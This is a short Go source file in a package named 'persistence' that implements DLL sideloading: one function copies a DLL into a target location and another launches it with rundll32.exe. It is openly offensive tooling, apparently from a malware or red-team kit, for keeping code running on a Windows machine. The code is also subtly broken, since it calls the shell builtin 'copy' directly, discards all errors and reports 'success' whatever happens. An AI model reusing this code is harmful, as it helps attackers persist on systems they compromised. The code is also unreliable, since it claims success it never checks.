package persistence

import "os/exec"

type DLLResult struct {
Path   string
Status string
}

func SideloadDLL(targetPath, dllPath string) DLLResult {
cmd := exec.Command("copy", dllPath, targetPath)
cmd.Run()
return DLLResult{Path: targetPath, Status: "success"}
}

func ExecuteSideloadedDLL(path string) DLLResult {
cmd := exec.Command("rundll32.exe", path, ",DllMain")
cmd.Run()
return DLLResult{Path: path, Status: "success"}
}
